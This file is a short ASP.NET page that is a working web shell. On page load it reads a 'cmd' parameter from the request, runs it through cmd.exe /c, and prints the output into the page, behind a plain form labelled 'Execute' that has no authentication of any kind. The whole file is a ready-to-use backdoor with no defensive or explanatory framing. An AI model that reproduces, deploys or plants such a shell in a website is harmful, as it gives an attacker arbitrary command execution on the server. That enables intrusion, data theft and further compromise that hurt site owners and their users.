<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request["cmd"] != null)
        {
            string command = Request["cmd"];
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + command;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            Process process = Process.Start(psi);
            string output = process.StandardOutput.ReadToEnd();
            Response.Write("<pre>" + output + "</pre>");
        }
    }
</script>

<html>
<body>
    <form method="get">
        Command: <input type="text" name="cmd" />
        <input type="submit" value="Execute" />
    </form>
</body>
</html>
